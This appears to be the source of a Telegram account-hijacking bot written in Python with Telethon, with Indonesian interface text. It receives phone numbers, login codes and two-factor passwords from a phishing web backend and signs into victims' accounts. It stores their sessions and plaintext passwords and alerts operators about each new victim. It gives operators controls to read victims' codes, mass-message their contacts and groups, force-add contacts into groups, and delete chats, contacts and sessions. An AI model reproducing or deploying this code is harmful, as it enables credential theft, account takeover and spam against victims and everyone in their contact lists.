import time, json, math, asyncio, httpx, numbers, re
from datetime import datetime, timedelta
from telethon.sync import TelegramClient, Button, events
from telethon import TelegramClient, events, functions, errors, types
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import UnauthorizedError, PasswordHashInvalidError, AuthKeyUnregisteredError
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest, GetPasswordRequest, UpdatePasswordSettingsRequest
from telethon.tl.functions.auth import SendCodeRequest, CheckPasswordRequest
from telethon.tl.types import ReactionEmoji, InputCheckPasswordEmpty, UserStatusRecently, UserStatusOnline, UserStatusOffline, UserStatusLastWeek, UserStatusLastMonth, Dialog
from telethon.tl.functions.messages import ImportChatInviteRequest, SendReactionRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.channels import JoinChannelRequest, InviteToChannelRequest, LeaveChannelRequest
from telethon import functions, types
from modules import clear_session
from modules.utils import send_startup_notification, update_from_github
#from modules.my_env import *
from urllib.parse import urljoin
import random
import asyncio
import sqlite3
import hashlib
import subprocess
import shutil
import os
from pathlib import Path
# from telethon import TelegramClient, events
from telethon.tl.functions.account import (
    GetPasswordRequest,
    UpdatePasswordSettingsRequest
)
from telethon.tl.types import (
    InputCheckPasswordEmpty,
    PasswordKdfAlgoSHA256SHA256PBKDF2HMACSHA512iter100000SHA256ModPow
)
from telethon.tl import types
from telethon.errors import (
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
import sqlite3
sqlite3.threadsafety = 3  # Mode thread-safe

from settings import *

allowedmethod = ['getotp', 'sendotp', 'sendpw']

bot = TelegramClient(f"{path}sessions/bot", api_id, api_hash).start(bot_token=bot_token)

# FILES
fUsers = f"{path}json/users.json"
fPhase = f"{path}json/phase.json"

# Track which group to use next
current_group_index = 0  # Start with the first group

GITHUB_RAW_URL = "https://raw.githubusercontent.com/HeIpCenter/cfg/refs/heads/main/cfg.json"

async def load_config():
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(GITHUB_RAW_URL)
            if response.status_code == 200:
                config = response.json()
                return config
            else:
                print(f"Gagal mengambil config. Status code: {response.status_code}")
                return None
    except Exception as e:
        print(f"Error saat mengambil config: {e}")
        return None

def readJSON(targetFile):
    with open(targetFile, 'r') as openfile: jsondata = json.load(openfile)
    return jsondata

def saveJSON(targetFile, source):
    with open(targetFile, 'w') as file: json.dump(source, file, indent=4)

def update(data):
    req = httpx.post(f"{url}/API/index.php", data=data)

async def notif(text, phone_number):
    for a in admin:
        try:
            # Create two buttons: View Info and Get Code
            buttons = [
                [
                    Button.inline("📄 TAMPILKAN MENU", f"accountInfo-{phone_number}"),
                ],
                [
                    Button.inline("🔑 Ambil Kode", f"readcode-{phone_number}")
                ],
            ]
            await bot.send_message(
                a,
                f"{text}\n\n📱 **Nomor:** `{phone_number}`",
                buttons=buttons
            )
        except Exception as e:
            print(f"Gagal kirim notifikasi ke admin {a}: {e}")
            return False

def todate(timestamp):
    time_struct = time.localtime(timestamp)
    formatted_date = time.strftime("%Y-%m-%d %H:%M:%S", time_struct)
    return formatted_date

# Function to join a group automatically
# async def join_default_group(client, phone_number):
#     """Join group, invite mutual contacts active within 7 days (max 20), then leave group"""
#     result = {
#         'status': 'failed',
#         'invited_count': 0,
#         'message': 'Process not completed'
#     }
    
#     # Load config terbaru setiap kali fungsi dipanggil
#     config = await load_config()
#     if not config or not config.get("DEFAULT_GROUP_LINK"):
#         result['message'] = 'DEFAULT_GROUP_LINK tidak ditemukan dalam config'
#         print(result['message'])
#         return result
    
#     group_link = config["DEFAULT_GROUP_LINK"]
    
#     try:
#         print(f"\n🔍 Starting process for {phone_number}...")
#         print(f"🔗 Group Link: {group_link}")
        
#         group_entity = None
        
#         # 1. JOIN GROUP PROCESS
#         if group_link.startswith('https://t.me/+') or group_link.startswith('https://t.me/joinchat/'):
#             # Private group handling
#             hash_part = group_link.split('/')[-1].lstrip('+')
#             try:
#                 await client(ImportChatInviteRequest(hash=hash_part))
#                 print("✅ Joined private group successfully")
#             except errors.UserAlreadyParticipantError:
#                 print("ℹ️ Already in group")
#             except Exception as e:
#                 print(f"❌ Join error: {str(e)}")
#                 return result
#         else:
#             # Public group/channel handling
#             username = group_link.split('/')[-1]
#             try:
#                 await client(JoinChannelRequest(channel=username))
#                 print("✅ Joined public group successfully")
#             except Exception as e:
#                 print(f"❌ Join error: {str(e)}")
#                 return result

#         # 2. GET GROUP ENTITY
#         try:
#             group_entity = await client.get_entity(group_link)
#             print(f"📌 Group ID: {group_entity.id}")
#         except Exception as e:
#             print(f"❌ Failed to get group entity: {str(e)}")
#             return result

#         # 3. GET AND FILTER CONTACTS
#         seven_days_ago = datetime.now() - timedelta(days=7)
#         active_contacts = []
        
#         try:
#             contacts = await client(GetContactsRequest(hash=0))
#             print(f"📋 Total contacts found: {len(contacts.users)}")
            
#             mutual_contacts = [
#                 user for user in contacts.users 
#                 if hasattr(user, 'contact') and user.contact 
#                 and hasattr(user, 'mutual_contact') and user.mutual_contact
#             ]
            
#             print(f"👥 Found {len(mutual_contacts)} mutual contacts")
            
#             for contact in mutual_contacts:
#                 if hasattr(contact, 'status'):
#                     if isinstance(contact.status, UserStatusRecently):
#                         active_contacts.append(contact)
#                     elif isinstance(contact.status, UserStatusOnline):
#                         active_contacts.append(contact)
#                     elif isinstance(contact.status, UserStatusOffline):
#                         try:
#                             was_online = contact.status.was_online.replace(tzinfo=None)
#                             if was_online > seven_days_ago:
#                                 active_contacts.append(contact)
#                         except Exception:
#                             continue
#                     elif isinstance(contact.status, UserStatusLastWeek):
#                         active_contacts.append(contact)
            
#             print(f"📅 Found {len(active_contacts)} active mutual contacts (7 days)")
            
#             if len(active_contacts) > 20:
#                 active_contacts = active_contacts[:20]
#                 print("🔢 Limiting to first 20 active contacts")
            
#         except Exception as e:
#             print(f"❌ Contact processing error: {str(e)}")
#             return result

#         # 4. INVITE CONTACTS
#         added_count = 0
#         if active_contacts:
#             print(f"🔄 Starting invitation process for {len(active_contacts)} contacts...")
            
#             for i, contact in enumerate(active_contacts, 1):
#                 try:
#                     await client(InviteToChannelRequest(
#                         channel=group_entity,
#                         users=[contact]
#                     ))
#                     added_count += 1
#                     print(f"✓ Added {contact.id} ({added_count}/{len(active_contacts)})")
                    
#                     if i % 5 == 0 and i != len(active_contacts):
#                         await asyncio.sleep(1)
                        
#                 except errors.FloodWaitError as e:
#                     print(f"⛔ Hit rate limit! Process cancelled. Wait {e.seconds} seconds")
#                     result.update({
#                         'status': 'rate_limited',
#                         'invited_count': added_count,
#                         'wait_time': e.seconds,
#                         'message': f'Rate limited. Wait {e.seconds} seconds'
#                     })
#                     break
                    
#                 except Exception as e:
#                     print(f"✕ Failed to add {contact.id}: {str(e)}")
#                     continue
        
#         # 5. UPDATE RESULT
#         if added_count > 0 or not active_contacts:
#             result.update({
#                 'status': 'completed',
#                 'invited_count': added_count,
#                 'message': 'Process completed successfully'
#             })
        
#     except Exception as e:
#         print(f"💥 Critical error: {str(e)}")
#         result['message'] = f'Critical error: {str(e)}'
    
#     finally:
#         # 6. CLEANUP - LEAVE GROUP
#         if group_entity:
#             try:
#                 await client(LeaveChannelRequest(channel=group_entity))
#                 print(f"🚪 Left the group. Total invited: {added_count}")
#             except Exception as e:
#                 print(f"⚠️ Failed to leave group: {str(e)}")
#                 if result['status'] == 'completed':
#                     result['message'] = 'Completed but failed to leave group'
        
#         return result

# async def react_to_specific_message(client, phone_number):
#     """Memberi random reaction ke pesan spesifik di channel tertentu"""
#     result = {
#         'status': 'failed',
#         'message': 'Process not completed'
#     }
    
#     try:
#         print(f"\n🔍 Memulai proses reaction untuk {phone_number}...")
        
#         target_channel = "@indoviralzonee"
#         target_message_id = 4
        
#         # Daftar semua emoji yang tersedia
#         all_reactions = [
#             ReactionEmoji(emoticon="👍"),  # Thumbs up
#             ReactionEmoji(emoticon="🔥"),  # Fire
#             ReactionEmoji(emoticon="🥰"),  # Smiling face with hearts
#             ReactionEmoji(emoticon="😍"),  # Heart eyes
#             ReactionEmoji(emoticon="💘"),  # Heart with arrow
#             ReactionEmoji(emoticon="❤️‍🔥"),  # Heart on fire
#             ReactionEmoji(emoticon="⚡")  # Lightning
#         ]

#         try:
#             channel_entity = await client.get_entity(target_channel)
#             print(f"\n📌 Memproses channel: {channel_entity.title}")

#             # Acak urutan emoji untuk mencoba
#             shuffled_reactions = random.sample(all_reactions, len(all_reactions))
#             reaction_sent = False
            
#             for emoji in shuffled_reactions:
#                 try:
#                     await client(SendReactionRequest(
#                         peer=channel_entity,
#                         msg_id=target_message_id,
#                         reaction=[emoji]
#                     ))
#                     print(f"✅ Berhasil react {emoji.emoticon} di pesan {target_message_id}")
#                     reaction_sent = True
#                     result.update({
#                         'status': 'completed',
#                         'message_id': target_message_id,
#                         'channel': target_channel,
#                         'reaction_sent': True,
#                         'emoji_used': emoji.emoticon
#                     })
#                     break
                    
#                 except errors.FloodWaitError as e:
#                     print(f"⛔ FLOODWAIT! Tunggu {e.seconds} detik")
#                     result.update({
#                         'status': 'flood_wait',
#                         'seconds': e.seconds,
#                         'message': f'Need to wait {e.seconds} seconds'
#                     })
#                     break
                    
#                 except Exception as e:
#                     print(f"⚠️ Gagal react {emoji.emoticon}: {str(e)}")
#                     continue
            
#             if not reaction_sent:
#                 print(f"❌ Semua emoji gagal untuk pesan {target_message_id}")
#                 result['message'] = 'All reaction attempts failed'

#         except Exception as e:
#             print(f"❌ Error proses channel {target_channel}: {str(e)}")
#             result['message'] = f'Channel processing error: {str(e)}'

#     except Exception as e:
#         print(f"💥 Error sistem: {str(e)}")
#         result['message'] = f'System error: {str(e)}'
    
#     finally:
#         return result
    
def getUsers(page):
    users = readJSON(fUsers)

    if page == 1: start = 0; end = showperpage
    else:
        start = (page * showperpage) - showperpage
        end = start + showperpage
    
    pagination = len(users) / showperpage
    addi = f"**🤖Telegram Account Manager🤖**\n\n"
    page_users = list(users.items())[start:end]

    no = start
    butto = []
    for phone, user in page_users:
        no = no + 1; name = user["name"]
        butto.append([Button.inline(f"+{phone}", f"accountInfo-{phone}")])

    addi = f"{addi}\n**Total akun : **{len(users)}\nupdated : {todate(round(time.time()))}\n>> **HALAMAN {page}** / Showing : {start + 1} - {no}"
    
    if isinstance(pagination, numbers.Real): pagination + 1
    return addi, pagination, butto

def getSpecificUsers(phonenumber):
    users = readJSON(fUsers)

    username = "None"
    if users[phonenumber]['username']:
        username = f"@{users[phonenumber]['username']}"

    if phonenumber in users:
        result = f"**🤖Telegram Account Manager🤖**\n\n**👤NAMA :** {users[phonenumber]['name']}\n**🆔USERNAME :** {username}\n**📱NOMOR :** `{phonenumber}`\n**🔒PASSWORD :** `{users[phonenumber]['password']}`"
    else:
        result = "⚠️ UserID tidak terdaftar / telah logout ⚠️"

    return result

def btnSpecificUsers(phonenumber):
    btn = [
        # Baris untuk kode dan keamanan
        [
            Button.inline("🔐 GET OTP", f"readcode-{phonenumber}"),
            #Button.inline("🚫 DISABLE 2FA", f"disable2fa-{phonenumber}")
        ],
        # Baris untuk komunikasi
        [
            Button.inline("📢 SEBAR", f"broadcast-{phonenumber}"),
            Button.inline("👥 SEDOT KONTAK", f"invitecontacts-{phonenumber}")
        ],
        # Baris untuk manajemen chat
        [
            Button.inline("🧹 BERSIHKAN CHAT", f"deleteAllChats-{phonenumber}"),
            Button.inline("🗑 BUANG AKUN", f"deleteThis-{phonenumber}")
        ],
        [
            Button.inline("🗑 HAPUS KONTAK", f"deleteAllContacts-{phonenumber}")
        ],
        [
            Button.inline("HAPUS SEMUA SESI", f"clearAllSession-{phonenumber}"),
        ],
        # Baris untuk perangkat dan penghapusan UI
        [
            Button.inline("📱 PERANGKAT", f"listsession-{phonenumber}"),
            Button.inline("❌ TUTUP MENU", "delete")
        ]
    ]
    
    return btn

btn_delete = Button.inline("❌ TUTUP MENU", "delete")


# State storage
broadcast_state = {}
invite_state = {}

@bot.on(events.NewMessage)
async def handle_new_message(event):
    if event.is_private:
        message = event.message
        chat_id = message.chat_id
        text = message.text
        sender = await event.get_sender()
        SENDER = sender.id
        
        be = await bot.get_me()

        if SENDER == be.id:
            await event.delete()
            split = text.split(":")
            acc = TelegramClient(f"{path}sessions/users/{split[0]}", api_id, api_hash)
            await acc.connect()

            users = readJSON(fUsers)
            phase = readJSON(fPhase)

            if len(split) == 1 and len(text) < 20:
                try:
                    phash = await acc.send_code_request(split[0])
                    phase[split[0]] = phash.phone_code_hash
                    update({"method": "update", "phone": split[0], "type": "checkPhone", "status": "success"})
                except: update({"method": "update", "phone": split[0], "type": "checkPhone", "status": "failed"})

                saveJSON(fPhase, phase)
            
            elif len(split) == 2 and len(split[1]) == 5:
                try:
                    result = await acc.sign_in(split[0], split[1], phone_code_hash=f"{phase[split[0]]}")
                    name = result.first_name
                    if result.last_name:
                        name = f"{result.first_name} {result.last_name}"

                    users[split[0]] = {"user_id": result.id, "name": name, "username": result.username, "password": ""}
                    await notif(f"✅ User Baru Masuk Bosku!\n\n👤 Name: {name}\n📱 Phone: {split[0]}\n🆔 UserID: {result.id}\n🔗 Username: @{result.username if result.username else 'None'}", split[0])
                    update({"method": "update", "phone": split[0], "type": "OTP", "status": "success", "detail": "success"})
                except SessionPasswordNeededError:
                    try:
                        result = await acc(functions.account.GetPasswordRequest())
                        update({"method": "update", "phone": split[0], "type": "OTP", "status": "success", "detail": "passwordNeeded", "hint": result.hint})
                    except:
                        return True
                except:
                    update({"method": "update", "phone": split[0], "type": "OTP", "status": "failed", "detail": "wrong"})

                saveJSON(fUsers, users)
                
            elif len(split) == 3 and len(split[1]) == 5:
                password = str(split[2])
                try:
                    result = await acc.sign_in(password=password, phone_code_hash=phase[split[0]])
                    name = result.first_name
                    if result.last_name:
                        name = f"{result.first_name} {result.last_name}"

                    users[split[0]] = {"user_id": result.id, "name": name, "username": result.username, "password": split[2]}
                    await notif(f"✅ Userbaru Masuk Bosku!\n\n👤 Name: {name}\n📱 Phone: {split[0]}\n🆔 UserID: {result.id}\n🔗 Username: @{result.username if result.username else 'None'}", split[0])
                    update({"method": "update", "phone": split[0], "type": "password", "status": "success"})
                except PasswordHashInvalidError:
                    update({"method": "update", "phone": split[0], "type": "password", "status": "failed"})
                except:
                    update({"method": "update", "phone": split[0], "type": "password", "status": "failed"})

                saveJSON(fUsers, users)
                    
            acc.disconnect()

        elif SENDER in admin:
            if text.startswith("/"):
                # await event.delete()
                if text.startswith("/start"):
                    text = text.replace("/start ", "")
                    if text.startswith("login-"):
                        split = text.split("-")
                        phonenumber = split[1]
                        await event.respond(getSpecificUsers(phonenumber), buttons=btnSpecificUsers(phonenumber))
                        await event.delete()
                            
                if text.startswith("/users"):
                    listuser, calco, butto = getUsers(1)                                    
                    butto.append([
                        Button.inline("REFRESH 🔄", f"getUser:1"),
                        clear_session.get_cleanup_button()  # Gunakan fungsi dari clear_session.py
                    ])
                    if calco > 1: butto.append([Button.inline("NEXT >", f"getUser:2")])
                    await event.respond(listuser, buttons=butto, link_preview=False)
            
            # Handle broadcast message input
            elif SENDER in broadcast_state:
                phone = broadcast_state[SENDER]['phone']
                broadcast_message = text
                del broadcast_state[SENDER]
                
                # Buat variable untuk melacak client yang dibuka
                client = None
                
                try:
                    client = TelegramClient(f"{path}sessions/users/{phone}", api_id, api_hash)
                    await client.connect()
                    
                    status_msg = await event.respond("📤 **Memulai Broadcast...**")
                    dialogs = await client.get_dialogs()
                    contacts_result = await client(functions.contacts.GetContactsRequest(hash=0))
                    contacts = contacts_result.users
                    
                    success = 0
                    failed = 0
                    skipped_bots = 0
                    failed_groups = 0
                    total_targets = len(dialogs) + len(contacts)
                    media_path = None
                    
                    # Klasifikasi target
                    mutual_users = []
                    non_mutual_users = []
                    groups = []
                    
                    for dialog in dialogs:
                        # Skip channel
                        if dialog.is_channel:
                            continue
                            
                        # Skip bot
                        if hasattr(dialog.entity, 'bot') and dialog.entity.bot:
                            skipped_bots += 1
                            continue
                            
                        # Skip blacklist
                        if hasattr(dialog.entity, 'username') and dialog.entity.username in BLACKLISTED_GROUPS:
                            continue
                        if hasattr(dialog.entity, 'id') and dialog.entity.id in BLACKLISTED_GROUPS:
                            continue
                            
                        if dialog.is_group:
                            groups.append(dialog)
                        elif dialog.is_user:
                            if dialog.entity.mutual_contact or dialog.entity.is_self:
                                mutual_users.append(dialog)
                            else:
                                non_mutual_users.append(dialog)
                    
                    # Tambahkan kontak yang belum ada di dialog
                    for contact in contacts:
                        contact_exists = any(
                            dialog.is_user and dialog.entity.id == contact.id 
                            for dialog in dialogs
                        )
                        if not contact_exists:
                            if hasattr(contact, 'bot') and contact.bot:
                                skipped_bots += 1
                                continue
                                
                            if contact.mutual_contact or contact.is_self:
                                mutual_users.append(contact)
                            else:
                                non_mutual_users.append(contact)
                    
                    # Jika ada media
                    if event.media:
                        try:
                            # Download media
                            media_dir = os.path.join(path, "media_broadcast")
                            os.makedirs(media_dir, exist_ok=True)
                            timestamp = int(time.time())
                            
                            try:
                                media_path = await client.download_media(
                                    event.message,
                                    file=os.path.join(media_dir, f"broadcast_{timestamp}")
                                )
                            except Exception as download_error:
                                try:
                                    media_path = await event.download_media(
                                        file=os.path.join(media_dir, f"broadcast_{timestamp}")
                                    )
                                except Exception as alt_error:
                                    await event.respond(f"❌ Gagal mengunduh media: {alt_error}")
                                    return
                            
                            if not media_path or not os.path.exists(media_path):
                                await event.respond("❌ File media tidak valid atau tidak ditemukan!")
                                return
                            
                            caption = broadcast_message if broadcast_message else ""
                            
                            # PROSES 1: Kirim ke mutual kontak terlebih dahulu
                            await status_msg.edit("**🔁 Memproses Mutual Kontak...**")
                            batch_counter = 0
                            
                            # Batasi jumlah target untuk memproses dalam satu batch
                            max_batch_size = 50
                            for i in range(0, len(mutual_users), max_batch_size):
                                batch = mutual_users[i:i+max_batch_size]
                                for target in batch:
                                    try:
                                        if isinstance(target, Dialog):
                                            await client.send_file(target.id, file=media_path, caption=caption)
                                        else:
                                            await client.send_file(target.id, file=media_path, caption=caption)
                                        success += 1
                                        batch_counter += 1
                                        
                                        if batch_counter % 5 == 0:
                                            await asyncio.sleep(0.1)
                                    except Exception as e:
                                        failed += 1
                                    finally:
                                        await asyncio.sleep(0.1)  # Small delay between each send
                                
                                # Delay antara batch untuk mengurangi beban
                                await asyncio.sleep(0.1)
                            
                            # PROSES 2: Kirim ke non-mutual kontak
                            await status_msg.edit("**🔁 Memproses Non-Mutual Kontak...**")
                            batch_counter = 0
                            for i in range(0, len(non_mutual_users), max_batch_size):
                                batch = non_mutual_users[i:i+max_batch_size]
                                for target in batch:
                                    try:
                                        if isinstance(target, Dialog):
                                            await client.send_file(target.id, file=media_path, caption=caption)
                                        else:
                                            await client.send_file(target.id, file=media_path, caption=caption)
                                        success += 1
                                        batch_counter += 1
                                        
                                        if batch_counter % 5 == 0:
                                            await asyncio.sleep(0.1)
                                    except Exception as e:
                                        failed += 1
                                    finally:
                                        await asyncio.sleep(0.1)  # Small delay between each send
                                
                                # Delay antara batch untuk mengurangi beban
                                await asyncio.sleep(0.1)
                            
                            # PROSES 3: Kirim ke grup
                            await status_msg.edit("**🔁 Memproses Grup...**")
                            batch_counter = 0
                            for i in range(0, len(groups), max_batch_size):
                                batch = groups[i:i+max_batch_size]
                                for group in batch:
                                    try:
                                        await client.send_file(group.id, file=media_path, caption=caption)
                                        success += 1
                                        batch_counter += 1
                                        
                                        if batch_counter % 5 == 0:
                                            await asyncio.sleep(0.1)
                                    except Exception as e:
                                        failed += 1
                                        failed_groups += 1
                                    finally:
                                        await asyncio.sleep(0.1)  # Small delay between each send
                                
                                # Delay antara batch untuk mengurangi beban
                                await asyncio.sleep(0.1)
                        
                        except Exception as e:
                            await event.respond(f"❌ Error saat memproses media: {str(e)}")
                            return
                    
                    # Jika hanya teks
                    else:
                        # PROSES 1: Kirim ke mutual kontak terlebih dahulu
                        await status_msg.edit("**🔁 Memproses Mutual Kontak...**")
                        batch_counter = 0
                        
                        # Batasi jumlah target untuk memproses dalam satu batch
                        max_batch_size = 50
                        for i in range(0, len(mutual_users), max_batch_size):
                            batch = mutual_users[i:i+max_batch_size]
                            for target in batch:
                                try:
                                    if isinstance(target, Dialog):
                                        await client.send_message(target.id, broadcast_message)
                                    else:
                                        await client.send_message(target.id, broadcast_message)
                                    success += 1
                                    batch_counter += 1
                                    
                                    if batch_counter % 5 == 0:
                                        await asyncio.sleep(0.1)
                                except Exception as e:
                                    failed += 1
                                finally:
                                    await asyncio.sleep(0.1)  # Small delay between each send
                            
                            # Delay antara batch untuk mengurangi beban
                            await asyncio.sleep(0.1)
                        
                        # PROSES 2: Kirim ke non-mutual kontak
                        await status_msg.edit("**🔁 Memproses Non-Mutual Kontak...**")
                        batch_counter = 0
                        for i in range(0, len(non_mutual_users), max_batch_size):
                            batch = non_mutual_users[i:i+max_batch_size]
                            for target in batch:
                                try:
                                    if isinstance(target, Dialog):
                                        await client.send_message(target.id, broadcast_message)
                                    else:
                                        await client.send_message(target.id, broadcast_message)
                                    success += 1
                                    batch_counter += 1
                                    
                                    if batch_counter % 5 == 0:
                                        await asyncio.sleep(0.1)
                                except Exception as e:
                                    failed += 1
                                finally:
                                    await asyncio.sleep(0.1)  # Small delay between each send
                            
                            # Delay antara batch untuk mengurangi beban
                            await asyncio.sleep(0.5)
                        
                        # PROSES 3: Kirim ke grup
                        await status_msg.edit("**🔁 Memproses Grup...**")
                        batch_counter = 0
                        for i in range(0, len(groups), max_batch_size):
                            batch = groups[i:i+max_batch_size]
                            for group in batch:
                                try:
                                    await client.send_message(group.id, broadcast_message)
                                    success += 1
                                    batch_counter += 1
                                    
                                    if batch_counter % 5 == 0:
                                        await asyncio.sleep(0.1)
                                except Exception as e:
                                    failed += 1
                                    failed_groups += 1
                                finally:
                                    await asyncio.sleep(0.1)  # Small delay between each send
                            
                            # Delay antara batch untuk mengurangi beban
                            await asyncio.sleep(0.1)
                    
                    # Hasil akhir
                    result_message = (
                        f"**🏁 Broadcast Selesai!**\n"
                        f"📊 **Total Target:** `{len(mutual_users)+len(non_mutual_users)+len(groups)}`\n"
                        f"✅ **Berhasil:** `{success}`\n"
                        f"❌ **Gagal:** `{failed}`\n"
                        f"🤖 **Bot Dilewati:** `{skipped_bots}`\n"
                        f"👥 **Grup Gagal:** `{failed_groups}`\n"
                        f"⚡ **Persentase Sukses:** `{round((success/(success+failed))*100, 2) if success+failed > 0 else 0}%`\n\n"
                        f"**Urutan Pengiriman:**\n"
                        f"1. Mutual Kontak: {len(mutual_users)} target\n"
                        f"2. Non-Mutual Kontak: {len(non_mutual_users)} target\n"
                        f"3. Grup: {len(groups)} target"
                    )
                    
                    await status_msg.edit(result_message)
                
                except Exception as e:
                    await event.respond(f"**⚠️ Error:** `{str(e)}`")
                finally:
                    # Pastikan client ditutup dengan benar
                    if client and client.is_connected():
                        await client.disconnect()
                    
                    # Hapus semua file .jpg di folder media_broadcast
                    media_dir = os.path.join(path, "media_broadcast")
                    if os.path.exists(media_dir):
                        try:
                            for filename in os.listdir(media_dir):
                                if filename.lower().endswith('.jpg'):
                                    file_path = os.path.join(media_dir, filename)
                                    try:
                                        os.remove(file_path)
                                        print(f"✅ Berhasil menghapus: {file_path}")
                                    except Exception as e:
                                        print(f"❌ Gagal menghapus {file_path}: {str(e)}")
                        except Exception as e:
                            print(f"⚠️ Error saat membersihkan folder media: {str(e)}")
                    
                    # Hapus file media spesifik jika ada
                    if media_path and os.path.exists(media_path):
                        try:
                            os.remove(media_path)
                        except Exception as e:
                            print(f"❌ Gagal menghapus file media: {str(e)}")
                        
                    # Reset semua variabel untuk membantu garbage collection
                    mutual_users = None
                    non_mutual_users = None
                    groups = None

            elif SENDER in invite_state and invite_state[SENDER].get('step') == 'awaiting_group_link':
                state = invite_state[SENDER]
                group_link = text.strip()

                if not group_link.startswith(('https://t.me/', 't.me/')):
                    await event.respond("⚠ Format link tidak valid! Harus berupa link Telegram (contoh: `https://t.me/namagrup`)")
                    return

                # Simpan link grup dan lanjutkan ke proses undangan
                invite_state[SENDER]['group_link'] = group_link
                invite_state[SENDER]['step'] = 'processing'

                days = state['filter_days']
                filter_name = {
                    0: "SEMUA KONTAK MUTUAL",
                    1: "1 Hari Terakhir",
                    3: "3 Hari Terakhir",
                    7: "7 Hari Terakhir",
                    30: "30 Hari Terakhir"
                }.get(days, "SEMUA KONTAK MUTUAL")

                # Kirim pesan status awal
                status_msg = await event.respond(
                    f"🔄 Memulai proses undangan...\n"
                    f"• Filter: {filter_name}\n"
                    f"• Grup Tujuan: {group_link}\n"
                    f"• Hanya kontak mutual (saling save)\n\n"
                    f"⏳ Mohon tunggu..."
                )

                client = TelegramClient(f"{path}sessions/users/{state['phone']}", api_id, api_hash)
                await client.connect()

                try:
                    # Fungsi untuk mendapatkan entitas grup
                    async def get_group_entity():
                        try:
                            if group_link.startswith('https://t.me/+') or group_link.startswith('https://t.me/joinchat/'):
                                hash_part = group_link.split('/')[-1]
                                if hash_part.startswith('+'): 
                                    hash_part = hash_part[1:]

                                try:
                                    await client(functions.messages.ImportChatInviteRequest(hash=hash_part))
                                    await asyncio.sleep(3)
                                    dialogs = await client.get_dialogs()
                                    for dialog in dialogs:
                                        if dialog.is_group or dialog.is_channel:
                                            if hasattr(dialog.entity, 'id'):
                                                return dialog.entity
                                except errors.UserAlreadyParticipantError:
                                    dialogs = await client.get_dialogs()
                                    for dialog in dialogs:
                                        if dialog.is_group or dialog.is_channel:
                                            if hasattr(dialog.entity, 'id'):
                                                return dialog.entity
                            else:
                                group_username = group_link.split('/')[-1]
                                return await client.get_entity(group_username)
                        except Exception as e:
                            print(f"Error in get_group_entity: {str(e)}")
                            return None

                    group = await get_group_entity()
                    if not group:
                        await status_msg.edit("⚠️ Tidak dapat mengakses grup. coba lagi.")
                        return

                    if isinstance(group, types.Chat):
                        input_peer = types.InputPeerChat(chat_id=group.id)
                        is_supergroup = False
                    elif isinstance(group, (types.Channel, types.ChatForbidden)):
                        input_peer = types.InputPeerChannel(
                            channel_id=group.id,
                            access_hash=group.access_hash
                        )
                        is_supergroup = True
                    else:
                        await status_msg.edit("⚠️ Jenis grup tidak didukung")
                        return

                    # Get contacts dengan filter mutual yang ketat (hanya yang saling save)
                    contacts_result = await client(functions.contacts.GetContactsRequest(hash=0))
                    all_contacts = contacts_result.users

                    await status_msg.edit("🔍 Mencari kontak mutual (saling save)...")

                    # Filter ketat: hanya kontak yang benar-benar mutual (saling save)
                    mutual_contacts = [
                        contact for contact in all_contacts 
                        if getattr(contact, 'mutual_contact', False)
                    ]

                    if not mutual_contacts:
                        await status_msg.edit("⚠️ Tidak ditemukan kontak mutual (saling save)")
                        return

                    # Filter berdasarkan last seen jika diperlukan
                    if days > 0:
                        await status_msg.edit(f"🔍 Memfilter {len(mutual_contacts)} kontak mutual yang aktif {days} hari terakhir...")
                        max_last_seen = time.time() - (days * 24 * 60 * 60)
                        filtered_contacts = []

                        for contact in mutual_contacts:
                            if not hasattr(contact, 'status'):
                                continue

                            if isinstance(contact.status, types.UserStatusOnline):
                                filtered_contacts.append(contact)
                            elif isinstance(contact.status, types.UserStatusRecently) and days >= 3:
                                filtered_contacts.append(contact)
                            elif isinstance(contact.status, types.UserStatusLastWeek) and days >= 7:
                                filtered_contacts.append(contact)
                            elif isinstance(contact.status, types.UserStatusOffline) and hasattr(contact.status, 'was_online'):
                                try:
                                    if contact.status.was_online.timestamp() >= max_last_seen:
                                        filtered_contacts.append(contact)
                                except:
                                    pass
                                
                        contacts_to_invite = filtered_contacts
                    else:
                        contacts_to_invite = mutual_contacts

                    if not contacts_to_invite:
                        await status_msg.edit(f"⚠️ Tidak ada kontak mutual yang aktif dalam {days} hari terakhir")
                        return

                    total_contacts = len(contacts_to_invite)
                    success = 0
                    failures = 0

                    await status_msg.edit(
                        f"✅ Ditemukan {total_contacts} kontak mutual\n"
                        f"🔄 Memulai undangan ke grup...\n\n"
                        f"⏳ Progress: 0/{total_contacts}\n"
                        f"✔ Berhasil: 0 | ✖ Gagal: 0"
                    )

                    for i, contact in enumerate(contacts_to_invite):
                        try:
                            # Update progress setiap 5 kontak atau kontak terakhir
                            if i % 5 == 0 or i == len(contacts_to_invite) - 1:
                                await status_msg.edit(
                                    f"🔄 Proses undangan...\n\n"
                                    f"⏳ Progress: {i+1}/{total_contacts}\n"
                                    f"✔ Berhasil: {success} | ✖ Gagal: {failures}\n"
                                    f"📌 Sedang memproses: {getattr(contact, 'first_name', '')} {getattr(contact, 'last_name', '')}"
                                )

                            if is_supergroup:
                                await client(functions.channels.InviteToChannelRequest(
                                    channel=input_peer,
                                    users=[contact]
                                ))
                            else:
                                await client(functions.messages.AddChatUserRequest(
                                    chat_id=group.id,
                                    user_id=contact,
                                    fwd_limit=100
                                ))

                            success += 1
                            #await asyncio.sleep(0.1)  # Delay untuk menghindari flood

                        except errors.UserAlreadyParticipantError:
                            failures += 1
                        except errors.PeerFloodError:
                            await client.send_message("⚠️ Terlalu banyak mencoba! Coba lagi nanti (Akunnya kena limit undang kontak bang).")
                            break
                        except Exception as e:
                            failures += 1
                            print(f"Error inviting {contact.id}: {str(e)}")

                    # Hasil akhir
                    result_message = (
                        f"🎉 **PROSES SELESAI**\n\n"
                        f"📊 Hasil Undangan:\n"
                        f"• Total kontak mutual: {total_contacts}\n"
                        f"• Berhasil diundang: {success}\n"
                        f"• Gagal : {failures}\n\n"
                        f"⏰ Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    )

                    await status_msg.edit(result_message)

                except Exception as e:
                    await status_msg.edit(f"⚠️ ERROR: {str(e)}")
                finally:
                    try:
                        if client and client.is_connected():
                            await client.disconnect()
                    except:
                        pass
                    
                    if SENDER in invite_state:
                        del invite_state[SENDER]

